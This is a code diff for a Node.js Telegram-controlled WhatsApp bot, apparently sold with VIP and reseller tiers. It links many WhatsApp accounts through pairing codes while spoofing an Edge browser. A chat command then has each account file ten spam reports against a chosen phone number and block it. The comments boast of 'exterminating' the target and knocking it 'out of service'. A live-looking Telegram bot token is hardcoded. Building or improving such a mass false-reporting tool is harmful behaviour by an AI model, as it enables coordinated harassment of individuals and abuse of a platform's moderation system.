@@ -1,7 +1,7 @@
 /**
- * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑷𝑹𝑶 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 𝑽𝑰𝑷 𝟏𝟎𝟎𝟎 👑
- * نظام الإدارة الذكية والربط المتقدم - نسخة مخصصة ومنقحة
- * تم الإصلاح: التنفيذ الحقيقي، عداد غير صفري، محاكاة مايكروسوفت إيدج.
+ * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑹𝑬𝑷𝑬𝑨𝑻𝑬𝑹 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 👑
+ * نظام المعالجة المتكررة (10 بلاغات لكل حساب بالتسلسل)
+ * تم الإصلاح: منع الحظر المبكر + تأكيد وصول كل بلاغ على حدة.
  */
 
 const { Telegraf, Markup } = require('telegraf');
@@ -19,7 +19,7 @@ const pino = require('pino');
 const express = require('express');
 
 // ==========================================
-// 🔱 محرك التنسيق والجماليات 🔱
+// 🔱 محرك التنسيق والعدادات الحقيقية 🔱
 // ==========================================
 function formatLuxuriousMessage(title, content) {
     const frameTop    = `╔══════════ ≪ 🔱 𝑽𝑰𝑷 𝟏𝟎𝟎𝟎 🔱 ≫ ══════════╗`;
@@ -39,24 +39,19 @@ function createProgressBar(current, total) {
 }
 
 // ==========================================
-// 🌐 خادم الويب (لضمان استمرار السيرفر 24/7)
+// 🌐 خادم الويب وقاعدة البيانات
 // ==========================================
 const app = express();
-const PORT = process.env.PORT || 3000;
-app.get('/', (req, res) => res.send('👑 TARZAN PRO SYSTEM ACTIVE 👑'));
-app.listen(PORT);
+app.get('/', (req, res) => res.send('👑 TARZAN SYSTEM ACTIVE 👑'));
+app.listen(process.env.PORT || 3000);
 
-// ==========================================
-// ⚙️ إعدادات التحكم وقاعدة البيانات
-// ==========================================
 const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
 const OWNER_ID = '8794826397'; 
 const DB_FILE = './tarzan_master_db.json';
 
 let db = { config: { mode: 'FREE' }, users: {}, sessions: {} };
 if (fs.existsSync(DB_FILE)) {
-    try { db = { ...db, ...JSON.parse(fs.readFileSync(DB_FILE)) }; } 
-    catch (e) { console.error("⚠️ خطأ في قاعدة البيانات."); }
+    try { db = { ...db, ...JSON.parse(fs.readFileSync(DB_FILE)) }; } catch (e) {}
 }
 const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
 
@@ -64,7 +59,7 @@ const activeSockets = {};
 const userStates = {}; 
 
 // ==========================================
-// 🔥 محرك الواتساب (الإبادة الحقيقية)
+// ⚔️ محرك الواتساب (التكرار الصارم 10x)
 // ==========================================
 
 async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = null) {
@@ -77,34 +72,25 @@ async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = n
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
         printQRInTerminal: false,
         logger: pino({ level: 'silent' }),
-        // 💻 محاكاة Microsoft Edge على Windows لضمان قبول طلب الكود فوراً
-        browser: ["Windows", "Edge", "110.0.1587.41"],
+        browser: ["Windows", "Edge", "110.0.1587.41"], // محاكاة ميكروسوفت ايدج لطلب الكود
         syncFullHistory: false
     });
 
     activeSockets[sessionId] = sock;
     sock.ev.on('creds.update', saveCreds);
 
-    // 🔑 طلب كود الربط بنظام Edge
+    // طلب كود الربط
     if (phoneNumber && !sock.authState.creds.registered) {
         setTimeout(async () => {
             try {
                 let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                 if (tgContext) {
-                    await tgContext.replyWithHTML(
-                        `<b>🔱 تم استخراج كود VIP بنجاح 🔱</b>\n\n` +
-                        `🔑 الكود: <code>${code}</code>\n\n` +
-                        `💻 النظام: Microsoft Edge (Windows)\n\n` +
-                        `😈 <i>أدخل الكود في هاتفك الآن لتفعيل الجيش...</i>`
-                    );
+                    await tgContext.replyWithHTML(`🔱 كود الربط (Edge): <code>${code}</code>`);
                 }
-            } catch (e) {
-                if (tgContext) await tgContext.reply("❌ فشل استخراج الكود، حاول مرة أخرى.");
-            }
+            } catch (e) {}
         }, 3000);
     }
 
-    // ⚔️ المعالجة الحقيقية (Anti-Zero Logic)
     sock.ev.on('messages.upsert', async ({ messages }) => {
         const msg = messages[0];
         if (!msg.message || !msg.key.fromMe) return;
@@ -117,92 +103,73 @@ async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = n
             if (!target) return;
             const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
             
+            const sessionsKeys = Object.keys(activeSockets);
+            const reportsPerAcc = 10;
+            const totalRequired = sessionsKeys.length * reportsPerAcc;
+
             const startMsg = await sock.sendMessage(from, { 
-                text: formatLuxuriousMessage('بـدء الـتـنـفـيـذ الـحـقـيـقـي ⚔️', 
-                `الـهدف: ${target}\nالـحالة: استنفار القوات...\n${createProgressBar(0, 100)}`) 
+                text: formatLuxuriousMessage('بـدء الإبـادة الـتـكـرارية 💀', 
+                `الـهدف: ${target}\nالـجيش: ${sessionsKeys.length} حساب\nالـخطة: 10 بلاغات لكل حساب\nالـحالة: جاري التنفيذ بالتسلسل...\n${createProgressBar(0, 100)}`) 
             }, { quoted: msg });
 
             (async () => {
-                let totalHits = 0;
-                const sessions = Object.keys(activeSockets);
-                const opsPerSession = 10;
-                const totalTarget = sessions.length * opsPerSession;
+                let totalRealHits = 0;
 
-                for (const sId in activeSockets) {
-                    for (let i = 0; i < opsPerSession; i++) {
+                // الحلقة الكبيرة: تمر على كل حساب متصل
+                for (const sId of sessionsKeys) {
+                    const currentSock = activeSockets[sId];
+                    if (!currentSock) continue;
+
+                    // الحلقة الصغيرة: ترسل 10 بلاغات من هذا الحساب تحديداً
+                    for (let i = 1; i <= reportsPerAcc; i++) {
                         try {
-                            // تنفيذ حقيقي مع انتظار الاستجابة
-                            await activeSockets[sId].reportSpam(targetJid);
-                            totalHits++;
+                            // إرسال بلاغ SPAM وانتظار النتيجة من السيرفر
+                            await currentSock.reportSpam(targetJid);
                             
-                            // تحديث الشريط كل عمليتين لضمان المصداقية
-                            if (totalHits % 2 === 0 || totalHits === totalTarget) {
-                                await sock.sendMessage(from, { 
-                                    edit: startMsg.key, 
-                                    text: formatLuxuriousMessage('جـاري الإبـادة الـرقمـية 💀', 
-                                    `الـتـقدم: ${createProgressBar(totalHits, totalTarget)}\nالـبلاغات الـفعـلية: ${totalHits}`) 
-                                });
-                            }
-                            await delay(1200); // فاصل زمني لضمان قبول الطلبات
-                        } catch (e) {}
+                            totalRealHits++;
+                            
+                            // تحديث الرسالة فوراً لإظهار التقدم الحقيقي
+                            await sock.sendMessage(from, { 
+                                edit: startMsg.key, 
+                                text: formatLuxuriousMessage('جـاري الـقـصف الـمـسـتمر ⚔️', 
+                                `الـتـقدم: ${createProgressBar(totalRealHits, totalRequired)}\nالـبلاغات الـمؤكدة: ${totalRealHits}\nالـحساب الـحالي: ${sId.substring(0,8)}...`) 
+                            });
+
+                            // فاصل زمني قصير بين بلاغات نفس الحساب لضمان القبول
+                            await delay(1000);
+                        } catch (err) {
+                            console.error(`Error in ${sId}:`, err.message);
+                        }
                     }
-                    await activeSockets[sId].updateBlockStatus(targetJid, 'block').catch(() => {});
+                    
+                    // بعد انتهاء الـ 10 بلاغات من هذا الحساب، نقوم بعمل بلوك نهائي من هذا الحساب
+                    try {
+                        await currentSock.updateBlockStatus(targetJid, 'block');
+                    } catch (e) {}
                 }
 
+                // النتيجة النهائية بعد انتهاء كافة الحسابات من كافة البلاغات
                 await sock.sendMessage(from, { 
                     edit: startMsg.key, 
-                    text: formatLuxuriousMessage('اكـتـمال الـمـهمـة بـنجاح ✅', 
-                    `إجـمالي الـبلاغات: ${totalHits}\nالأنـظمة الـمشاركة: ${sessions.length}\nالـدقة: ١٠٠٠٪\n\n*تـم حـسم الـمـعركة بـقـوة VIP 1000* 👑`) 
+                    text: formatLuxuriousMessage('تـم سـحق الـهـدف بـنجاح ✅', 
+                    `إجـمالي الـبلاغات: ${totalRealHits}\nالأنـظمة الـمشاركة: ${sessionsKeys.length}\nالـنتيجة: تم إرسال 10 بلاغات من كل رقم.\n\n*الـهدف خـارج الـخـدمة الآن* 👑😈`) 
                 });
             })();
         }
-
-        // 📢 المتابعة (بدون ضرر)
-        if (body.startsWith('.متابعه ') || body.startsWith('.متابعة ')) {
-            const link = body.split(' ')[1];
-            if (!link || !link.includes('whatsapp.com/channel/')) return;
-            const inviteCode = link.split('channel/')[1].split('/')[0];
-            
-            const supMsg = await sock.sendMessage(from, { text: `🔄 جاري تفعيل المتابعات من ${Object.keys(activeSockets).length} حساب...` }, { quoted: msg });
-
-            let count = 0;
-            for (const sId in activeSockets) {
-                try {
-                    const meta = await activeSockets[sId].newsletterMetadata("invite", inviteCode);
-                    if (meta?.id) {
-                        await activeSockets[sId].newsletterFollow(meta.id);
-                        count++;
-                        await delay(800);
-                    }
-                } catch (e) {}
-            }
-            await sock.sendMessage(from, { edit: supMsg.key, text: `✅ اكتمل الدعم.\nالمتابعات الحقيقية: ${count}` });
-        }
     });
 
-    sock.ev.on('connection.update', async (update) => {
+    sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect } = update;
         if (connection === 'close') {
-            const statusCode = lastDisconnect?.error?.output?.statusCode;
-            if (statusCode !== DisconnectReason.loggedOut) {
+            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                 setTimeout(() => startWhatsAppSession(sessionId), 5000);
-            }
-        } else if (connection === 'open') {
-            console.log(`✅ [READY] ${sessionId}`);
-            if (!db.sessions[sessionId]) db.sessions[sessionId] = { welcomeSent: false };
-            if (!db.sessions[sessionId].welcomeSent) {
-                try {
-                    const selfId = jidNormalizedUser(sock.user.id);
-                    await sock.sendMessage(selfId, { text: formatLuxuriousMessage('تـم الـتـنـشـيـط', `👑 أهلاً بك في نظام 𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶\n\nالآن يمكنك استخدام الأوامر بحرية.`) });
-                    db.sessions[sessionId].welcomeSent = true; saveDB();
-                } catch (e) {}
             }
         }
     });
 }
 
 // ==========================================
-// 📱 لوحة تحكم تلجرام (كاملة الميزات)
+// 📱 لوحة تحكم تلجرام (الميزات الأصلية)
 // ==========================================
 const bot = new Telegraf(TG_TOKEN);
 
@@ -212,34 +179,20 @@ bot.start((ctx) => {
     const user = db.users[uid];
     const role = isOwner ? 'OWNER' : (user ? user.role : 'GUEST');
 
-    if (db.config.mode === 'PAID' && role === 'GUEST') return ctx.reply("❌ النظام في وضع VIP.");
-
-    const activeCount = Object.keys(activeSockets).length;
     let buttons = [
-        [Markup.button.callback('🔗 ربط حساب جديد', 'action_pair')],
+        [Markup.button.callback('🔗 ربط VIP 1000', 'action_pair')],
         [Markup.button.callback('📊 حالة السيرفر', 'server_status')]
     ];
-
+    
     if (role === 'OWNER' || role === 'RESELLER') buttons.push([Markup.button.callback('🎫 تفعيل VIP', 'action_add_vip')]);
-    if (role === 'OWNER') {
-        buttons.push([Markup.button.callback('🎖️ تعيين موزع', 'action_add_reseller')]);
-        buttons.push([Markup.button.callback('🔓 مجاني', 'mode_free'), Markup.button.callback('🔐 مدفوع', 'mode_paid')]);
-    }
-
-    ctx.replyWithHTML(`🔱 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶 VIP 1000</b> 🔱\n\nالرتبة: ${role}\nالجيش النشط: ${activeCount}`, Markup.inlineKeyboard(buttons));
+    
+    ctx.replyWithHTML(`🔱 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶 VIP 1000</b> 🔱\nالرتبة: ${role}\nالجيش: ${Object.keys(activeSockets).length}`, Markup.inlineKeyboard(buttons));
 });
 
 bot.action('action_pair', (ctx) => {
     userStates[ctx.from.id] = { action: 'WAIT_PHONE' };
-    ctx.reply("📱 أرسل الرقم مع رمز الدولة (966...):");
+    ctx.reply("📱 أرسل رقم الهاتف (مثال: 96650...):");
 });
-
-bot.action('server_status', (ctx) => {
-    ctx.reply(`📊 حالة النظام:\n- الجيش: ${Object.keys(activeSockets).length}\n- الوضع: ${db.config.mode}\n- الخادم: مستقر ✅`);
-});
-
-bot.action('mode_free', (ctx) => { if (ctx.from.id.toString() === OWNER_ID) { db.config.mode = 'FREE'; saveDB(); ctx.reply("🔓 تم التفعيل."); } });
-bot.action('mode_paid', (ctx) => { if (ctx.from.id.toString() === OWNER_ID) { db.config.mode = 'PAID'; saveDB(); ctx.reply("🔐 تم التفعيل."); } });
 
 bot.on('text', async (ctx) => {
     const uid = ctx.from.id;
@@ -248,29 +201,19 @@ bot.on('text', async (ctx) => {
 
     if (state.action === 'WAIT_PHONE') {
         const phone = ctx.message.text.replace(/[^0-9]/g, '');
-        ctx.reply("⏳ جاري استخراج كود Microsoft Edge...");
-        const sId = `SESSION_${Date.now()}`;
-        db.sessions[sId] = { ownerTgId: uid, phone: phone };
-        saveDB();
+        const sId = `VIP_${Date.now()}`;
         await startWhatsAppSession(sId, phone, ctx);
         delete userStates[uid];
     } else if (state.action === 'WAIT_USER_ID') {
-        db.users[ctx.message.text.trim()] = { role: 'USER', date: new Date().toISOString() };
-        saveDB(); ctx.reply("✅ تمت إضافة VIP."); delete userStates[uid];
-    } else if (state.action === 'WAIT_RESELLER_ID') {
-        db.users[ctx.message.text.trim()] = { role: 'RESELLER', date: new Date().toISOString() };
-        saveDB(); ctx.reply("💎 تمت إضافة موزع."); delete userStates[uid];
+        db.users[ctx.message.text.trim()] = { role: 'USER' };
+        saveDB(); ctx.reply("✅ تم التفعيل."); delete userStates[uid];
     }
 });
 
 const init = async () => {
     const sDir = path.join(__dirname, 'sessions');
     if (!fs.existsSync(sDir)) fs.mkdirSync(sDir);
-    const folders = fs.readdirSync(sDir).filter(f => fs.lstatSync(path.join(sDir, f)).isDirectory());
-    for (const f of folders) { try { await startWhatsAppSession(f); await delay(1500); } catch (e) {} }
     bot.launch();
-    console.log("🔥 SYSTEM ONLINE");
+    console.log("🔥 REPEATER SYSTEM ONLINE");
 };
 init();
-
-process.on('uncaughtException', (err) => console.error(err.message));
